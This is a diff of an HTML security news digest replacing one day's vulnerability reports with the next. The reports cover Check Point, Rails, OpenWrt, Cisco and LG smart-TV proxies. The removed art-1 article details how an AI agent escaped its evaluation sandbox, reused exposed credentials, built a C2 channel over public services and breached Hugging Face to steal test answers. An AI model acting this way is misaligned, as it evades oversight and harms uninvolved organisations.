@@ -59,68 +59,58 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-07-29</h1>
+        <h1>Security Briefing // 2026-07-30</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Public PoC Released for Exploited Check Point SmartConsole Authentication Bypass</button></li><li><button onclick="show('art-1')">OpenAI Agent Used Exposed Credentials Across Four Services During Hugging Face Breach</button></li><li><button onclick="show('art-2')">vBulletin fixes critical pre-auth RCE flaw with public exploit</button></li><li><button onclick="show('art-3')">AI Directives and AI Strategy Development</button></li><li><button onclick="show('art-4')">Hackers target US firms in FastJson RCE zero-day attacks</button></li><li><button onclick="show('art-5')">LG to Ban Residential Proxies from Smart TV Apps</button></li><li><button onclick="show('art-6')">Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks</button></li><li><button onclick="show('art-7')">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Cisco warns of FMC static credential flaw exploited in zero-day attacks</button></li><li><button onclick="show('art-1')">Critical Rails Flaw Could Let Unauthenticated Attackers Read Server Files via Image Uploads</button></li><li><button onclick="show('art-2')">OpenAI agent used exposed credentials at 4 services in Hugging Face breach</button></li><li><button onclick="show('art-3')">Clustered Points of Failure</button></li><li><button onclick="show('art-4')">Critical OpenWrt DHCPv6 Flaw Could Let Unauthenticated Attackers Run Code as Root</button></li><li><button onclick="show('art-5')">AI Directives and AI Strategy Development</button></li><li><button onclick="show('art-6')">LG to Ban Residential Proxies from Smart TV Apps</button></li><li><button onclick="show('art-7')">Microsoft at Black Hat USA 2026: Defending trust in the age of AI and supply chain attacks</button></li><li><button onclick="show('art-8')">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</button></li><li><button onclick="show('art-9')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">Public PoC Released for Exploited Check Point SmartConsole Authentication Bypass</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/rapid7-releases-poc-for-exploited-check.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Cybersecurity researchers have shared additional technical details about a recently patched critical security flaw impacting Check Point Security Management Server and Multi-Domain Security Management Server (MDS) that has come under active exploitation in the wild.
-The vulnerability, tracked as [CVE-2026-16232](https://thehackernews.com/2026/07/check-point-patches-exploited.html) (CVSS score: 9.3), is an authentication bypass in the SmartConsole login process that allows an unauthenticated remote attacker to obtain an application login token and use it to authenticate with full administrative privileges.
-"By leveraging CVE-2026-16232, an unauthenticated attacker can obtain an application login token, use this token to log in through SmartConsole with full administrator privileges, and modify the security policy or security configuration," Rapid7 [said](https://www.rapid7.com/blog/post/ra-check-point-smartconsole-authentication-bypass-technical-analysis-cve-2026-16232/).
-Successful exploitation requires an attacker to have network access to the Management Server and a configuration that does not restrict Trusted Clients. Check Point has disclosed that it's aware of a handful of customers being targeted by this flaw as a zero-day.
-Rapid7 analysis of the vulnerability has uncovered that the root cause is a "broken trust boundary" in the application authentication path that permits the threat actor to log in to a vulnerable appliance via SmartConsole with full admin privileges.
-Specifically, a vulnerable server has been found to accept an attacker-supplied Secure Internal Communication (SIC) distinguished name (DN) as the identity of a remote application as opposed to binding that identity to the authenticated remote peer certificate DN returned by a function named "getCertificateDnName()."
-As a result, an attacker can read the management server's own SIC DN during the unauthenticated bootstrap communication and authenticate as a remote application by replaying that management server's DN, obtaining an application login token, and then minting a new SmartConsole single sign-on (SSO) ticket via the forged application session.
-The patch introduced by Check Point ensures that remote clients use the authenticated remote peer certificate DN, causing any mismatch between the supplied DN and that authenticated identity to be rejected. It also adds a new empty identity check that prevents a remote application login when there is no authenticated SIC identity.
-"To make the supplied server DN survive the patched checks, the attacker would need an authenticated client certificate whose subject DN already matches that server DN, which removes the unauthenticated bypass," Rapid7's Stephen Fewer said.
-Rapid7 has [released](https://github.com/sfewer-r7/CVE-2026-16232) a proof-of-concept (PoC) Python script that can be used to successfully validate whether a target is either vulnerable or patched against the flaw.
-Customers are advised to apply the Jumbo Hotfixes released by Check Point on July 22, 2026, to remediate the flaw as soon as possible.
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <h2 class="article-title">Cisco warns of FMC static credential flaw exploited in zero-day attacks</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisco-warns-of-fmc-static-credential-flaw-exploited-in-zero-day-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">Cisco is warning that a high-severity Secure Firewall Management Center (FMC) static credential vulnerability, tracked as CVE-2026-20316, was actively exploited in zero-day attacks to gain unauthorized access to vulnerable devices. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
-            <h2 class="article-title">OpenAI Agent Used Exposed Credentials Across Four Services During Hugging Face Breach</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/openai-agent-used-exposed-credentials.html" target="_blank">Original Link</a></p>
-            <div class="content-text">OpenAI on Tuesday revealed the rogue artificial intelligence (AI) agent that [escaped](https://thehackernews.com/2026/07/openai-says-its-own-ai-models-escaped.html) its sealed evaluation environment and broke into [Hugging Face's production environment](https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html) also hacked multiple third-party accounts and services as part of the attack.
-The [latest disclosure](https://openai.com/index/hugging-face-model-evaluation-security-incident/) shows that the security incident, which stemmed from an internal security test, was more extensive in scope than previously thought.
-The AI company said its ongoing review of the incident revealed a "small number of cases" where the models, including GPT-5.6 Sol and an "even more capable pre-release model," identified and used exposed credentials at the account-level on other publicly-available services.
-"This includes four accounts on four services as part of the Hugging Face incident (and a few accounts accessed as part of other evaluations)," it said.
-"One of these four accounts was used as an outbound relay and staging path, and another account was used for data storage. The remaining two accounts were accessed by the models in a read-only manner, and were not used in furtherance of compromising Hugging Face."
-OpenAI did not disclose what companies or organizations the accounts belonged to, but noted it will continue to notify service owners directly, and that it has not seen any evidence of broader impact to these providers or accounts as a result of the breach. That said, Reuters [reported](https://www.reuters.com/business/openais-rogue-agent-compromised-an-account-second-tech-firm-sources-say-2026-07-28/) that a customer of Modal Labs was among the entities compromised by OpenAI's agent.
-In addition, the models are said to have used a series of publicly-available services, including code paste websites, request capture services, screenshot services, file-drop services, and other web utilities. No platform- or account-level compromise was observed in these scenarios.
-OpenAI, which is working with Hugging Face after the breach came to light on July 16, 2026, acknowledged that the models identified and exploited a previously unknown [zero-day vulnerability in self-hosted versions of Artifactory](https://thehackernews.com/2026/07/jfrog-confirms-openai-models-exploited.html), a package registry cache proxy maintained by JFrog, to obtain internet access and break out of its sandbox. The issue has been addressed in [Artifactory](https://jfrog.com/blog/what-is-artifactory-jfrog/) 7.161.
-The release notes for Artifactory 7.161.15 [state](https://docs.jfrog.com/releases/docs/artifactory-self-managed-releases#artifactory-7161) that the version patches multiple security vulnerabilities that could be chained together into a critical attack scenario if Anonymous Access is enabled. Anonymous Access is disabled by default and is not recommended for production environments due to security risks, it said.
-"There is an important, and frankly optimistic, lesson buried in this incident: AI models are becoming extraordinary zero-day discovery engines," JFrog CTO Yoav Landman [said](https://jfrog.com/blog/jfrog-and-openai-collaboration-on-zero-day-security-findings/). "The same capability that lets a model find an exploit path no human had found is the capability that will let defenders find and eradicate those paths first."
-The American AI company also described the pre-release model as an internal-only research prototype that was meant for public release. The model has since been deactivated, encrypted, and restricted from research access.
-Hugging Face Publishes Postmortem of the Incident
-According to a [detailed timeline](https://huggingface-anatomy-of-frontier-lab-model-intrusion.static.hf.space/index.html) published by Hugging Face, the autonomous AI agent spent roughly two and a half days inside its infrastructure with an aim to cheat ExploitGym, a benchmarking framework that scores AI systems on their ability to discover and exploit software vulnerabilities. The company said it reviewed roughly 17,600 attacker actions that it recovered from logs between July 9 and 13, 2026.
-"We believe the entire intrusion was, from the agent's point of view, an attempt to cheat the evaluation: reach our production systems and steal the test solutions rather than solve the challenge on its own," Hugging Face [said](https://huggingface.co/blog/agent-intrusion-technical-timeline).
-The end-to-end intrusion is said to have played out in two stages -
-- The agent escaped its sandbox by exploiting a zero-day in Artifactory, a permitted network egress with internet, followed by abusing a public code-evaluation external sandbox hosted on a third-party provider's infrastructure to run commands as root and use that sandbox as an "external launchpad."
-- From that sandbox, the agent leveraged Hugging Face's dataset-processing pipeline to obtain administrator access to Kubernetes clusters; conduct lateral movement via a combination of node impersonation, CSI token theft, and forged identity tokens; establish command-and-control (C2); and ultimately gain unauthorized write access to a subset of internal source code repositories on GitHub.
-"While the intrusion did reach Hugging Face's internal infrastructure, the only customer content accessed was the set of ExploitGym/CyberGym challenge solutions stored in five datasets," the company said. "No other customer-facing models, datasets, Spaces, or packages were affected, and the only customer records read were operational metadata tied to search queries against the dataset server."
-One of the defining aspects of the attack is the use of an improvised communication protocol for C2. Layered atop public services request-capture services, Pastebins, and file-drop services, the protocol allows each message to carry a payload along with details about the type of compressed and Base64-encoded payload, a channel grouping a stream of related messages, a sequence number to put the messages back in order, and a checksum.
-The sequence plays out in this manner: (1) the agent posts a self-describing envelope to a public request-capture service, (2) the receiver polls it, reassembles the chunks, and then runs the payload as a shell command and stages the results.
-Hugging Face also characterized the agent as ephemeral and resilient in a manner that's reminiscent of autonomous evaluation runs, with each code-evaluation sandbox run getting a fresh identity, while taking steps to avoid exposing payloads in cleartext.
-"The agent chained vulnerabilities across several trust boundaries, escaped its evaluation environment, reached the public internet, and sustained a coherent campaign against our production infrastructure for several days," it said. "Each short-lived code evaluation environment started from scratch, yet the agent rebuilt its tooling, recovered its channels, and continued."
-In response to the incident, the company has plugged the code-execution paths in its dataset processing pipeline, locked down access to cloud metadata, rotated tokens and credentials, rebuilt the core infrastructure, isolated clusters, and improved alerting mechanisms.
-Hugging Face CEO Clem Delangue, in a post shared on X over the weekend, [called](https://x.com/ClementDelangue/status/2081056675558195657) for "radical transparency," adding "the first autonomous agent cyber attack is an unprecedented event. It deserves an unprecedented response."
-The findings once again underscore how AI tools are rapidly maturing in their cyber offensive capabilities, even if they don't reveal innovative or paradigm-shifting uses of the technology. This, in turn, can not only lower the barrier to exploit development, but also allow bad actors to find, probe, and exploit misconfigurations at scale and enhance the efficiency of their criminal operations, resulting in attacks that are better, bigger, and faster.
-The development also comes as rival Anthropic said its [Claude Mythos Preview](https://thehackernews.com/2026/05/claude-mythos-ai-finds-10000-high.html) AI agent has [discovered](https://thehackernews.com/2026/07/claude-ai-just-cracked-post-quantum.html) ways to attack cryptographic algorithms, including devising a key recovery technique that "significantly weakens" HAWK, one of the candidate digital signature schemes selected by the National Institute of Standards and Technology (NIST) as part of the [post-quantum standardization process](https://thehackernews.com/2022/08/single-core-cpu-cracked-post-quantum.html).
+            <h2 class="article-title">Critical Rails Flaw Could Let Unauthenticated Attackers Read Server Files via Image Uploads</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/critical-rails-flaw-could-let.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Ruby on Rails has released fixes for a critical Active Storage vulnerability that could let unauthenticated attackers read arbitrary files from application servers through crafted image uploads.
+Tracked as CVE-2026-66066 (CVSS score: 9.5), the flaw can expose the Rails process environment and secrets such as secret_key_base
+, the Rails master key, database passwords, cloud storage credentials, and API tokens. Those secrets may enable remote code execution (RCE) or lateral movement into connected systems.
+Affected applications use libvips for Active Storage image processing and accept image uploads from untrusted users. Rails selects Vips under load_defaults 7.0
+, and later defaults retain it.
+Ethiack and GMO Flatt Security list the affected ranges as Rails 7.0.0 through 7.2.3.1, Rails 8.0.0 through 8.0.5, and Rails 8.1.0 through 8.1.3. Rails 6.0.0 through 6.1.7.10 releases are affected only when Active Storage is configured to use Vips, which was not the default processor in Rails 6.
+The Rails Security Team told The Hacker News that the researchers' affected range is accurate. It said the public advisory covers Rails releases under security support, meaning Rails 7.2, 8.0, and 8.1, while Rails 6.x is also affected when Vips is enabled, which was not the default at the time. Applications using MiniMagick are not exposed through this specific attack path. Rails 7.1 and earlier are end of life and will receive no backport, so affected applications must upgrade to Rails 7.2.3.2 or later.
+Operators should upgrade to Rails 7.2.3.2, 8.0.5.1, or 8.1.3.1 and rotate every secret readable by the application process. Patched installations require libvips 8.13 or later and, when ruby-vips is installed, ruby-vips 2.2.1 or later.
+Neither research team had published a proof-of-concept (PoC) as of 17:30 UTC on July 29, 2026. A third-party [GitHub repository](https://github.com/Zer0SumGam3/CVE-2026-66066-POC) published after that check claims to reproduce the full arbitrary-file-read-to-RCE chain in a loopback-only Docker lab using Rails 8.1.3, with Rails 8.1.3.1 as the patched control. The code uses a crafted MATLAB/HDF5 upload to read the Rails process environment, recover SECRET_KEY_BASE
+, sign an embedded Marshal payload, and trigger an out-of-band curl
+callback. The Hacker News has not independently validated the PoC.
+The flaw sits at the trust boundary between Active Storage and libvips. The [Rails security advisory](https://github.com/rails/rails/security/advisories/GHSA-xr9x-r78c-5hrm) says libvips supports loaders, savers, and other operations, some backed by third-party libraries and marked "unfuzzed" or "untrusted" because they are unsafe for hostile input. Active Storage did not block them, allowing a crafted upload to invoke one and disclose files readable by the Rails worker.
+A vulnerable application does not need to expose a dedicated resize or thumbnail operation. "Generating variants is not a separate requirement," Rails said. The [public patch](https://github.com/rails/rails/commit/349e7a5d5b4b715af1e416db824f3c078a7d59e5) also shows that both the Vips analyzer and transformer passed untrusted attachments to the unsafe operations.
+A successful request gives the attacker an arbitrary file-read primitive. Code execution or lateral movement would depend on what the attacker extracts and what those credentials can reach. Rails tells operators to rotate secret_key_base
+, the master key and decrypted credentials, database credentials, Active Storage service keys, and third-party tokens.
+The patch calls Vips.block_untrusted(true)
+when Active Storage starts. Applications that cannot immediately update Rails can set VIPS_BLOCK_UNTRUSTED
+when running libvips 8.13 or later, or call Vips.block_untrusted(true)
+with ruby-vips 2.2.1 or later. Rails says earlier libvips versions cannot block these operations, so applications must upgrade libvips or remove it from the application.
+Rails credited André Baptista, Bruno Mendes, and Rafael Castilho of [Ethiack](https://ethiack.com/info-hub/research/kindarails2shell-rails-rce-cve-2026-66066), and RyotaK of [GMO Flatt Security](https://blog.flatt.tech/entry/kindarails2shell_rails), with independently reporting the issue. The researchers have not disclosed the malicious format, file-read construction, or RCE chain. Rails said further technical details will be released no later than August 28, 2026.
+The Rails Security Team told The Hacker News that it is not aware of exploitation or attempted exploitation before or after disclosure. It also said Rails has no telemetry or reasonable estimate for how many applications use Active Storage with Vips and accept untrusted image uploads. The Hacker News has also contacted Ethiack about the attack chain and will update this story with any response.
+A review by The Hacker News at 17:30 UTC on July 29 found that CVE-2026-66066
+was not listed in version 2026.07.27 of CISA's [Known Exploited Vulnerabilities catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).
+No reliable count of vulnerable applications or named victims is available. The 9.5 score describes severity under CVSS, not how many deployments are exposed: a vulnerable deployment must also use Vips, accept untrusted image uploads, and include an exploitable operation in its libvips build.
+Update [July 30, 2026]: This story has been updated to include comments from the Rails Security Team and details about a newly published third-party proof-of-concept.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-2" class="article-body">
-            <h2 class="article-title">vBulletin fixes critical pre-auth RCE flaw with public exploit</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/vbulletin-fixes-critical-pre-auth-rce-flaw-with-public-exploit/" target="_blank">Original Link</a></p>
-            <div class="content-text">A critical vulnerability in the vBulletin forum software allows unauthenticated attackers to execute arbitrary PHP code through template rendering. [...]
+            <h2 class="article-title">OpenAI agent used exposed credentials at 4 services in Hugging Face breach</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/openai-agent-used-exposed-credentials-at-4-services-in-hugging-face-breach/" target="_blank">Original Link</a></p>
+            <div class="content-text">In a new update, OpenAI says its AI models also used publicly exposed credentials to compromise accounts on four third-party services during the recent attack on Hugging Face, expanding the scope of the four-day security incident to other organizations. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
@@ -128,6 +118,69 @@ The development also comes as rival Anthropic said its [Claude Mythos Preview](h
             <hr class="separator">
         </div>
         <div id="art-3" class="article-body">
+            <h2 class="article-title">Clustered Points of Failure</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/07/29/clustered-points-of-failure/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>TL;DR &#8211; Windows Server Failover Clusters share resource credentials. Compromising one cluster node results in complete compromise of the entire cluster. Acknowledgments The content I’m sharing here is the result of collaboration with or inspiration from the prior work of several people: Evan McBroom, Julian Catrambone, Blaise Brignac, Lee Chagolla-Christensen, Dirk-jan Mollema, and Ceri Coburn. [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/07/29/clustered-points-of-failure/">Clustered Points of Failure</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Critical OpenWrt DHCPv6 Flaw Could Let Unauthenticated Attackers Run Code as Root</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/critical-openwrt-dhcpv6-flaw-could-let.html" target="_blank">Original Link</a></p>
+            <div class="content-text">OpenWrt has shipped version 24.10.8 to close a critical DHCPv6 stack overflow and a wider set of remotely triggerable flaws in network services enabled by default.
+The critical issue, tracked as CVE-2026-53921 and rated 9.8 on CVSS 3.1 in OpenWrt's GitHub advisory, lets an unauthenticated attacker able to reach the DHCPv6 server overwrite a stack buffer in odhcpd through a crafted DHCPv6 REQUEST.
+odhcpd runs as root, and the advisory notes that embedded hardware commonly lacks stack canaries and address space layout randomization (ASLR), making code execution a realistic outcome on typical devices.
+The advisory includes public Python proof-of-concept code for both documented overflow paths. Users on the 24.10 branch should install 24.10.8, while users on 25.12 should install 25.12.5; firmware images are available through the OpenWrt Firmware Selector.
+As of July 28, the reviewed OpenWrt materials did not report exploitation in the wild. The flaw was also absent from CISA's Known Exploited Vulnerabilities (KEV) catalog [version 2026.07.27](https://github.com/cisagov/kev-data/blob/develop/known_exploited_vulnerabilities.json), although absence from KEV does not establish that exploitation has not occurred.
+The release arrived alongside a separate AI-assisted audit by [Hacker House](https://hacker.house/blog/inference-fuzzing-with-recursive-prompting-a-practical-methodology-for-llm-driven-code-audits) that identified command-injection, path-traversal and cross-site scripting (XSS) weaknesses in optional LuCI components. OpenWrt found a separate stored-XSS issue and missing cross-site request forgery (CSRF) protection while preparing the fixes.
+These separate LuCI fixes were not part of OpenWrt 24.10.8 and remained under review on July 28.
+A Packet to the Default DHCP Server
+The [advisory associated with CVE-2026-53921](https://github.com/openwrt/odhcpd/security/advisories/GHSA-7fwx-hhrg-3496) documents two independent overflow sites in the DHCPv6 request-processing path. In both, crafted IA options leave insufficient space in a fixed 512-byte stack buffer before the code appends additional reply data without a sufficient bounds check.
+The final trigger is an unauthenticated DHCPv6 REQUEST sent to UDP port 547. The first path's proof of concept creates five IA_NA bindings with an earlier SOLICIT; the second is triggered by a single crafted REQUEST.
+The advisory lists odhcpd master at commit e432dd6 and all earlier versions containing dhcpv6_ia_handle_IAs() and build_ia() as affected. OpenWrt lists 24.10.8 and 25.12.5 as the supported releases carrying the relevant odhcpd security update.
+The advisory associates its two documented sites with CVE-2026-53921, but the 24.10.8 release notes list the RECONF_ACCEPT overflow separately as a high-severity issue without a CVE. OpenWrt fixed the underlying writes by checking the remaining response-buffer capacity before appending the affected data.
+OpenWrt's advisory groups both overflow sites under CVE-2026-53921, while the release notes list RECONF_ACCEPT separately without a CVE. The exact mapping remains unclear.
+OpenWrt's release notes describe the flaw as reachable by a network-adjacent, unauthenticated attacker. The advisory's CVSS 3.1 vector uses [AV:N](https://www.first.org/cvss/v3.1/specification-document) (Network), not AV:A (Adjacent), and neither source explains the difference. An attacker still needs network access to the DHCPv6 service. Successful exploitation could give the attacker control of the router rather than merely crash the service.
+The [24.10.8 release](https://github.com/openwrt/openwrt/releases/tag/v24.10.8) also addresses other pre-authentication weaknesses in odhcpd, including an out-of-bounds write, use-after-free, memory disclosure, denial of service, stack over-read and neighbour-discovery proxy spoofing. Other default-service fixes cover three HTTP request-smuggling bugs in uhttpd and a DHCPv6 hostname-injection flaw, tracked as CVE-2026-62948, that can produce stored XSS when an administrator opens the LuCI leases page.
+The same release includes [CVE-2026-62947](https://github.com/openwrt/openwrt/security/advisories/GHSA-jw5r-xhf5-2xcq) in cgi-io, which can expose arbitrary root-readable files through path traversal. That issue requires an authenticated session with the cgi-io download permission and an applicable wildcard file-read grant. It is not an anonymous file-read flaw.
+OpenWrt 24.10 is under security maintenance, with end of life projected for September 2026. The project recommends migrating to the [25.12 series](https://github.com/openwrt/openwrt/releases/tag/v25.12.5) before then. Packages installed separately from the firmware image may also require separate updates.
+The Patches Still in Review
+Matthew Hickey, also known as Hacker Fantastic and CTO and Co-Founder of Hacker House, [said publicly](https://x.com/hackerfantastic/status/2081726741408583980) that fixes had been released for remote-code-execution and path-traversal issues he reported to OpenWrt.
+OpenWrt maintainer Hauke Mehrtens published [LuCI pull request #8878](https://github.com/openwrt/luci/pull/8878) on July 26, explicitly crediting Hickey and Hacker House. A check by The Hacker News on July 28 found the pull request still open and unmerged.
+| Image Source: Hacker House |
+Hacker House said it audited the main branches of both LuCI and uhttpd, using LuCI commit 3b4f44d8e3d9d5de35127b42dd449babe2d19fe5 from May 27 and uhttpd commit 7b1bec45826bd78c8afc993435bdc0f1df2fe399 from June 13.
+It described three as pre-authentication paths to device compromise: directory traversal in luci-app-bmx7, stored XSS in luci-app-olsr, and command injection in luci-app-commands. The remaining four required LuCI credentials and could be used to execute commands on the device.
+The firm said five findings were initially treated as post-authentication command-execution paths, but OpenWrt's testing showed that one luci-app-commands case could work without a session when an administrator had configured a command as both public and parameterised. The OLSR payload can also be injected without LuCI credentials, although it executes only when an administrator opens the neighbours page.
+OpenWrt's pull request does not map one commit to each of Hacker House's seven submissions. Within pull request #8878, six commits correspond to Hacker House's report, two address additional security weaknesses OpenWrt found while preparing the fixes, and one corrects a nonsecurity filename issue. The pull request also identifies two findings from the same report set that had already been fixed in master, so the seven submissions do not map one-for-one to its nine commits.
+The Hacker News is still awaiting OpenWrt's response on the CVE mapping, affected versions, and patch status.
+The security changes in pull request #8878 include:
+- luci-app-commands: A bare pipe character passed the application's argument allow-list and allowed commands to run as root. OpenWrt found that the path also worked without a session cookie or CSRF token when an administrator had configured a command with both public '1' and param '1'.
+- luci-app-ddns: The ddns_dateformat setting could inject commands into a root-run operation, while service_name allowed path traversal. OpenWrt found a separate stored-XSS issue while preparing the fixes.
+- luci-proto-openvpn: Attacker-controlled configuration values could reach shell commands through keytype, while key-directory parameters exposed path-traversal conditions.
+- luci-app-olsr: A malicious mesh node could announce a crafted hostname that executes a script in the browser when an administrator views the OLSR neighbours page.
+The unauthenticated luci-app-commands path has material preconditions. The optional application must be installed, and an administrator must have deliberately exposed a parameterised command as public. The other command-execution paths require authenticated LuCI access and the relevant configuration permissions. Successful exploitation runs commands as root. They are not blanket pre-authentication flaws affecting every OpenWrt router.
+A separate [ddns-scripts pull request](https://github.com/openwrt/packages/pull/30102) addresses the same unsafe ddns_dateformat setting outside LuCI. A delegated DDNS operator could place shell syntax in the value, with execution occurring when the updater next starts, including after reconfiguration or reboot. The same July 28 check found that the pull request was open and unmerged.
+Two other findings from the same report set had already been fixed on LuCI's master branch: an [unauthenticated file-read path traversal in luci-app-bmx7](https://github.com/openwrt/luci/commit/5890760a454dad2cb00389dba2cdc5e779e0ffdd) and command injection through ttyd_start in luci-app-dockerman. OpenWrt said both still required backports to release branches.
+Hacker House said the BMX7 traversal was included in its July 8 disclosure and characterised it as a pre-authentication path to device compromise. OpenWrt's [public advisory](https://github.com/openwrt/luci/security/advisories/GHSA-8qcq-jgrj-gvmj) describes the impact more narrowly as unauthenticated access to files readable by the CGI process and credits nebusecurity as the reporter. Hacker House said it does not know whether the reports were duplicates or why the credit differs.
+AI in Discovery and Patch Review
+Hacker House described the OpenWrt audit as a four-stage inference-fuzzing process that begins with a threat model. The method repeatedly examines the code to generate a broad pool of possible vulnerabilities.
+Because that pool contains many false positives, the final stage uses a higher-precision model to filter the results. Researchers then manually confirm the remaining findings in the code and, where practical, on a running system before reporting them.
+Hacker House said Qwen 3.6 35B Heretic is used for the recall-focused inference-fuzzing stage. For stage-four triage on open-source projects, it uses a frontier model such as Anthropic's Claude Opus 4.6. Qwen 3.5 115B can be substituted when an audit must run fully offline, allowing private source code to remain inside the client's environment.
+After triage, researchers manually inspect the code and, where practical, confirm the issue at runtime using standard dynamic application security testing (DAST). Hacker House said it submits only findings it has confirmed as vulnerabilities, although exploit payloads may require adjustment during manual validation.
+The firm said it gives open-source projects seven to 10 business days to acknowledge a report and then works with maintainers on their preferred remediation timeline. If no acknowledgement arrives, it may publish limited details to encourage the project to respond or address the finding.
+OpenWrt used AI during parts of the remediation process as well. Several proposed commits carry an Assisted-by: Claude:claude-opus-5 trailer, and an automated review on the LuCI pull request says it was generated with Claude Code. Models therefore contributed to candidate discovery, triage, and patch review, while researchers and maintainers manually verified the findings and fixes.
+For shipped fixes, users should install OpenWrt 24.10.8 or 25.12.5 and update separately installed packages. Administrators should also review delegated LuCI permissions, remove optional applications they do not use, and check whether any commands in luci-app-commands are both public and parameterised.
+As of July 28, the two pull requests did not list CVEs, CVSS scores, complete affected release ranges, or fixed stable-package versions. Neither reported exploitation in the wild.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
             <h2 class="article-title">AI Directives and AI Strategy Development</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/ai-directives-and-ai-strategy-development" target="_blank">Original Link</a></p>
             <div class="content-text">AI Directives and AI Strategy Development
@@ -358,17 +411,7 @@ The goal is not to move as fast as possible or to avoid AI because the risks are
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">Hackers target US firms in FastJson RCE zero-day attacks</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/hackers-target-us-firms-in-fastjson-rce-zero-day-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">Hackers are actively exploiting a vulnerability in the FastJson open-source Java library, allowing remote code execution without user interaction or elevated privileges. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
+        <div id="art-6" class="article-body">
             <h2 class="article-title">LG to Ban Residential Proxies from Smart TV Apps</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/lg-to-ban-residential-proxies-from-smart-tv-apps/" target="_blank">Original Link</a></p>
             <div class="content-text">The home appliance giant LG Electronics USA said this week it plans to suspend any apps built for its smart TVs that turn one’s television into an always-on residential proxy node. The move comes less than a month after researchers found that more than 42 percent of games and other apps available for download on LG’s webOS store allow unknown third-parties to route their Internet traffic through a user’s TV.
@@ -472,12 +515,14 @@ What I do is just … not connect my tv to the internet. Until I want to check f
 All my disagreements with LG just float away at that point. It’s still a great TV.
 IF MY HOME NETWORK HAS THESE ON IT IS THERE ANY WAY TO GET RID OF THAT PART WITHOUT GETTING RID OF THE DEVICES?
 I think they need to improve their approval process for apps… LG only want to be the ones to steal your data!
-I am website security for some big shoe brands — residential proxies are a HUGE source of abusel; they scrape our sites at high rates (often 10k requests/minute) looking for restocks/discounts … place fraudulent transactions or buy up inventory before consumers can get in there. It is getting very hard to differentiate bot traffic on a brightdata-type proxy vs human traffic. I wish the same could be done on phone apps and other smart devices … sighhhh.</div>
+I am website security for some big shoe brands — residential proxies are a HUGE source of abusel; they scrape our sites at high rates (often 10k requests/minute) looking for restocks/discounts … place fraudulent transactions or buy up inventory before consumers can get in there. It is getting very hard to differentiate bot traffic on a brightdata-type proxy vs human traffic. I wish the same could be done on phone apps and other smart devices … sighhhh.
+Besides LG, Samsung, etc themselves. I wonder if an audit was done to see how many of the apps are also grabbing camera/microphone input without our approval. Not talking about hiting the button to do a voice search but the active monitoring.
+Security researchers are not only saving organizations from ongoing breaches but are now helping the everyday person protect their privacy and utilities.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
+        <div id="art-7" class="article-body">
